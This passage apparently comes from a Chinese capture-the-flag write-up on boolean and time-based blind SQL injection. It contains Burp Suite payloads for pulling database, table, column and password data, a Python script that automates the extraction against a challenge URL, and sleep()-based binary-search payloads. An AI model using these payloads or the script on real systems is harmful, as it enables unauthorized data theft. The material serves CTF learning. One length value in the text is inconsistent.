  2. 设置Positions  
  3. 设置两个变量的爆破类型  
  4. 开始爆破，根据返回长度确定爆破结果  
  5. 排序、转换字符  
payload2那一列即是数据库名每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名  
2、爆表  
payload
    " or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§)--+
  1. 与爆库的不同之处就是payload和结果长度，改一下  
  2. 开始爆破，根据返回长度确定爆破结果  
  3. 排序、转换字符  
3、爆字段  
payload
    " or (ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 2,1),§1§,1))=§32§)--+
  1. 与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)
  2. 开始爆破，根据返回长度确定爆破结果  
  3. 排序、转换字符  
3、爆数据  
payload
    " or (ascii(substr((select password from challenges.user_2 limit 1,1),§1§,1))=§32§)--+
  1. 与爆库的不同之处就是payload和结果长度，改一下(结果长度改为32)
  2. 开始爆破，根据返回长度确定爆破结果  
  3. 排序、转换字符  
**提高效率**  
为了省去转换字符并减少爆破时间，可以选择不使用ascii()函数，第二个变量的爆破类型改成Simple list  
如：爆库  
payload
    " or (substr(database(),§1§,1)='§a§')--+
爆破结果：  
发现没有区分大小写，所以再通过每个字符的ascii码是否大于等于97判断每个字符是大写还是小写，小于97即大写。  
这样就提高了一点效率。
#### 神来之笔-脚本盲注
使用BurpSuite半自动化盲注，看似可以。但是不是有一种方法，可以不用其他操作，轻松得到数据库的信息呢？于是想到使用脚本进行盲注来提高效率。布尔盲注脚本如下：
    import requests
    chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&=+'
    postdata={
        'username':'" or 1=1#',
        'password':'admin'
        }
    url="http://35.201.188.231:9000/challenge-02/post.php"
    r=requests.post(url,data=postdata)
    length=len(r.text)
    def name(url,length):
        dbname=''
        print("数据库名：",dbname)
        payload='" or ascii(substr(database(),{0},1))={1} #'
        #print("数据表名：",dbname)
        #payload='"or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#'
        #print("字段名：",dbname)
        #payload='"or ascii(substr((select column_name from information_schema.columns where table_name='user_2' and table_schema=database() limit 1,1),{0},1))={1}#'
        #print("数据：",dbname)
        #payload='" or ascii(substr((select password from user_2 limit 1,1),{0},1))={1}#'
        for i in range(1,40):
            char=''
            for x in chars:
                char_ascii=ord(x)
                payloads=payload.format(i,char_ascii)
                postdata={
                'username':payloads,
                'password':'admin'
                }
                r=requests.post(url,data=postdata)
                if len(r.text) == length:
                    dbname+=x
                    print(dbname)
                    char=x
                    break
            if char=='':
                break
        return dbname
    name(url,length)
测试一下  
如果传参方式是get传参，只需在url后添加`? 参数名=`，再将requests.post改成requests.get即可。
## BASE-TIME-BLIND-INJECT
### 题目信息
### 题干分析
第二次走进误区，刚看到这道题的时候  
从题目标题看出是时间盲注。试了单引号闭合和和双引号闭合，结果并没有什么用，于是查看了一下源码，发现关键点了。竟然有源码可以下载！  
查看下载的源码，发现是 `'"` 闭合，并且传参为POST传参。  
### 知识了解
**时间盲注**
  1. 时间盲注利用前提  
页面上没有显示位，也没有输出SQL语句执行错误信息。
正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。
  2. 时间盲注利用
  3. 该语句判断数据库个数，当数据库个数等于n页面返回延迟5秒
        if((select count(schema_name) from information_schema.schemata)=n,sleep(5),1)
  4. 该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟5秒
        if((select length(schema_name) from information_schema.schemata limit 0,1)=n,sleep(5),1)
  5. 该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟5秒
        if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))=n,sleep(5),1)
**相关函数**
  6. Length（）函数 返回字符串的长度
  7. substr（）截取字符串
  8. ascii（）返回字符的ascii码
  9. sleep(n)：将程序挂起一段时间 n为n秒
  10. if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
  11. count(column_name)函数返回指定列的值的数目(NULL 不计入)
### 开始测试
  1. 测试语句  
输入'" or if(1=1,sleep(5),1)#延迟5秒  
输入'" or if(1=2,sleep(5),1)#正常
  2. 测长度  
判断数据库名的长度  
输入'" or if((length(database())=10),sleep(5),1)--+延迟5秒  
说明长度为8。
  3. 测字符  
用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码  
输入'" or if((ascii(substr(database(),1,1))>97),sleep(5),1)--+延迟5秒
### 盲注开始
#### 费心劳神-手工盲注
同样利用二分法进行手工盲注，与布尔盲注不同之处是页面上没有回显，所以使用了if()函数和sleep()函数，根据返回时间判断。同样可以使用BurpSuite进行测试。  
1.猜库  
用到获取当前数据库函数`database()`
  * 猜库长
        '" or if((length(database())=10),sleep(5),1)--+延迟5秒
所以数据库长度为10
  * 猜库名  
第一个字符
        '" or if((ascii(substr(database(),1,1))>32),sleep(5),1)--+延迟5秒
    '" or if((ascii(substr(database(),1,1))>128),sleep(5),1)--+正常
    '" or if((ascii(substr(database(),1,1))>80),sleep(5),1)--+延迟5秒
    '" or if((ascii(substr(database(),1,1))>104),sleep(5),1)--+正常
    '" or if((ascii(substr(database(),1,1))>92),sleep(5),1)--+延迟5秒
    '" or if((ascii(substr(database(),1,1))>98),sleep(5),1)--+延迟5秒
    '" or if((ascii(substr(database(),1,1))>101),sleep(5),1)--+正常
    '" or if((ascii(substr(database(),1,1))>100),sleep(5),1)--+正常
    '" or if((ascii(substr(database(),1,1))>99),sleep(5),1)--+正常
说明数据库名的第一个字符ASCII码为99，即“c”。  
依次猜解，最终得到数据库名：`challenges`
2.猜表
  * 猜表长